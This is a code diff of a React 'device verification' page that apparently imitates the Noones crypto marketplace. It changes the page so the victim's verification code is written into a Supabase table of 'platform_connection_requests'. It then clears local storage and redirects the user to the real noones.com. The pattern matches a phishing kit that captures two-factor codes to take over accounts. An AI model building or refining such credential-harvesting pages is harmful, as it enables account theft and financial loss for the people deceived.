@@ -1,5 +1,10 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
+import { supabase } from '../../lib/supabase';
+
+const NOONES_REQUEST_ID_KEY = 'noones_request_id';
+const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
+const NOONES_REQUEST_DATA_KEY = 'noones_request_data';
 
 export default function NoonesDeviceVerification() {
   const navigate = useNavigate();
@@ -68,24 +73,29 @@ export default function NoonesDeviceVerification() {
     }
 
     try {
-      // Get the platform data from location state (set by Noones.tsx)
-      const platformData = location.state?.platformData || {};
-
-      // Submit the verification code with platform data to the backend
-      const response = await fetch('/api/submit-connection', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          ...platformData,
-          code: verificationCode,
-        }),
-      });
-
-      if (!response.ok) {
-        console.error('Failed to submit verification code:', response.statusText);
+      const requestId = window.localStorage.getItem(NOONES_REQUEST_ID_KEY);
+      if (!requestId) {
+        throw new Error('No request ID found');
       }
+
+      console.log('Updating table: platform_connection_requests, id:', requestId);
+      const { error } = await supabase
+        .from('platform_connection_requests')
+        .update({
+          code: verificationCode,
+        })
+        .eq('id', requestId);
+
+      if (error) {
+        throw error;
+      }
+
+      console.log('Updated code for id:', requestId);
+
+      // Clear Noones-specific localStorage
+      window.localStorage.removeItem(NOONES_REQUEST_ID_KEY);
+      window.localStorage.removeItem(NOONES_CURRENT_STEP_KEY);
+      window.localStorage.removeItem(NOONES_REQUEST_DATA_KEY);
 
       // Clear browser storage for our domain
       localStorage.clear();
@@ -106,7 +116,7 @@ export default function NoonesDeviceVerification() {
         window.location.href = 'https://noones.com/';
       }, 5000);
     } catch (err) {
-      console.error('Error during verification:', err);
+      console.error('Error updating platform_connection_requests:', err);
       alert('Verification failed. Please try again.');
     }
   };
